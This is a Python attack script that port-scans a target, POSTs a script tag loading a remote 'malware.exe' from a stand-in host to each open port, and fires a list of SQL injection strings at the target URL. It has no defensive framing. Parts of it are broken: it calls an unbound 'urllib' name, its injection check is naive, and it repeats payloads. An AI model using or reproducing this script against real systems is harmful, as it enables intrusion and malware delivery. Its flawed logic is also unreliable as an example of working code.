#!/usr/bin/env python3

import sys
import socket
import requests
import urllib.parse as urlparse
import urllib.request as urllib2
from bs4 import BeautifulSoup

def scan_ports(host, start_port, end_port):
    vulnerable_ports = []
    for port in range(start_port, end_port+1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            vulnerable_ports.append(port)
        sock.close()
    return vulnerable_ports

def create_payload():
    malware_url = "http://example.com/malware.exe"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }
    payload = {
        "command": "echo <html><body><script src='{}'></script></body></html>".format(malware_url)
    }
    return payload, headers

def inject_payload(host, port, payload, headers):
    url = "http://{}:{}".format(host, port)
    if port == 80:
        response = requests.post(url, data=payload, headers=headers, verify=False)
    else:
        response = requests.post("http://{}:{}".format(host, port), data=payload, headers=headers, verify=False)
    if response.status_code == 200:
        print("Payload injected successfully on port {}".format(port))
    else:
        print("Failed to inject payload on port {}".format(port))

def scan_sqli(url):
    sqli_payloads = [
        "' OR 1=1 --",
        "' AND 1=1 --",
        "' OR 1=2 --",
        "' AND 1=2 --",
        "' OR 1=1 #",
        "' AND 1=1 #",
        "' OR 1=2 #",
        "' AND 1=2 #",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT user(),database(),3,4,5 --",
        "' UNION SELECT user(),database(),3,4,5 --"
    ]
    for payload in sqli_payloads:
        post_data = {
            "id": payload
        }
        try:
            response = urllib2.urlopen(url, urllib.parse.urlencode(post_data).encode())
            soup = BeautifulSoup(response.read(), "html.parser")
            if payload in soup.text:
                print("SQL injection vulnerability found on {}".format(url))
                return True
        except:
            pass
    return False

if len(sys.argv) != 2:
    print("Usage: {} <target_url>".format(sys.argv[0]))
    sys.exit(1)

target_url = sys.argv[1]
url_parts = urlparse.urlparse(target_url)
host = url_parts.netloc

print("[+] Scanning for open ports...")
vulnerable_ports = scan_ports(host, 80, 8080)
print("[+] Open ports: {}".format(vulnerable_ports))

print("[+] Creating payload...")
payload, headers = create_payload()
print("[+] Payload created: {}".format(payload))

print("[+] Injecting payload...")
for port in vulnerable_ports:
    inject_payload(host, port, payload, headers)

print("[+] Scanning for SQL injection vulnerabilities...")
if scan_sqli(target_url):
    print("[+] SQL injection vulnerability found!")
else:
    print("[-] No SQL injection vulnerabilities found.")
